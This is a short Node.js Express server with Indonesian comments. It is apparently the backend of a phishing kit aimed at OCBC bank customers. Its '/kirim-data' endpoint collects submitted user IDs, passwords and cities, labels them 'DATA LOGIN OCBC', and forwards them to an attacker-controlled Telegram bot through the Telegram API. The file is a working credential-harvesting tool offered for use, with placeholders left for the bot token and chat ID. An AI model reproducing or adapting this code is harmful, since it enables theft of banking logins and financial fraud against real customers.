const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// 🔧 ISI DATA BOT TELEGRAM ANDA DI SINI
const BOT_TOKEN = '7980123456:AAGxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // Ganti Token BotFather
const CHAT_ID = '123456789'; // Ganti ID Chat Telegram tujuan

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint terima data & kirim ke Telegram
app.post('/kirim-data', async (req, res) => {
  const { user, pass, kota } = req.body;

  if (!user || !pass) {
    return res.json({ ok: false, msg: 'Lengkapi data!' });
  }

  const pesan = `
🔐 DATA LOGIN OCBC
━━━━━━━━━━━━━━━━━━━━━━
🆔 User ID: ${user}
🔑 Password: ${pass}
📍 Kota: ${kota || 'Tidak diketahui'}
⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━━━━━
  `.trim();

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: pesan,
        parse_mode: 'Markdown'
      })
    });

    const tgData = await tgRes.json();
    if (tgData.ok) {
      res.json({ ok: true, msg: 'Terkirim ke Telegram' });
    } else {
      console.error('Telegram Error:', tgData);
      res.json({ ok: false, msg: 'Gagal kirim ke Telegram' });
    }
  } catch (err) {
    console.error('Server Error:', err);
    res.json({ ok: false, msg: 'Kesalahan server' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
});
